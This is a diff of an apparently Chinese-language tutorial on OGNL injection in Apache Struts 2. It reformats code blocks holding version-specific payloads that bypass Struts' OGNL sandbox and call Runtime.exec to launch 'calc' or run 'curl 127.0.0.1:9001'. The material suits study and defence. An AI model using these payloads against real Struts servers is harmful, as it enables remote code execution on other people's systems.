@@ -13,7 +13,7 @@ tags:
 
 
 
-![0csDU0.png](https://s1.ax1x.com/2020/10/11/0csDU0.png)
+------------------------------------------------![0csDU0.png](https://s1.ax1x.com/2020/10/11/0csDU0.png)----------------------------------------------
 
 
 
@@ -37,7 +37,7 @@ value = Ognl.getValue(ognl,context,context.getRoot()) //执行
 
 demo 类
 
-```JAVA
+```java
 package com.diego.demo;
 
 import com.opensymphony.xwork2.Action;
@@ -153,13 +153,13 @@ public class Ognl_test implements Action {
 
 **Struts 2.3.14.1版本前**
 
-```java
+```
 (#_memberAccess['allowStaticMethodAccess']=true).(@java.lang.Runtime@getRuntime().exec('calc'))
 ```
 
 **2.3.14.1后 - 2.3.20版本前**
 
-```java
+```
 (#p=new java.lang.ProcessBuilder('calc')).(#p.start())
 ```
 
@@ -167,29 +167,39 @@ public class Ognl_test implements Action {
 
 **2.3.20版本 - 2.3.28版本** (本地2.3.37 也可
 
-```java
-(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('calc'))
+```
+(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+(@java.lang.Runtime@getRuntime().exec('calc'))
 ```
 
 
 
 **2.3.30(2.5.2)之后**
 
-```java
-(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('calc'))
+```
+(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).
+(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
+(@java.lang.Runtime@getRuntime().exec('calc'))
 ```
 
 
 
 **2.5.16**
 
-```java
+```
 第一次
 
-(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
+(#context=#attr['struts.valueStack'].context).
+(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
 
 第二次
-(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('curl 127.0.0.1:9001'))
+(#context=#attr['struts.valueStack'].context).
+(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).
+(@java.lang.Runtime@getRuntime().exec('curl 127.0.0.1:9001'))
 ```
 
 
